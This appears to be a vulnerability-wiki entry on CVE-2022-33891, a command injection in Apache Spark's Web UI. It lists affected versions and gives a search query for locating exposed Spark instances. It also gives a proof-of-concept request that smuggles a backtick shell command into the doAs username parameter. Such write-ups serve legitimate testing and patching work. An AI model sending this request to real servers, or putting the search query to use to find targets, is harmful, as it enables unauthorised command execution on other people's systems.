# Apache Spark doAs remote command execution vulnerability CVE-2022-33891

## Vulnerability Description

Apache Spark supports starting ACLs to provide authentication for Web UI access, and when ACLs start, you can create RCEs by constructing a special request username.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Spark Core - Apache <=3.0.3</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">3.1.1 <= Spark Core - Apache <=3.1.2</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">3.2.0 <= Spark Core - Apache <=3.2.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="APACHE-Spark"</span>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662174736577-4e5a3852-3359-43a2-8470-228e306f34e5.png)

Verify POC

```html
/jobs/?doAs=`touch /tmp/test.txt`
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662174983427-249a9ba2-f516-45dc-b08e-206c2830ff81.png)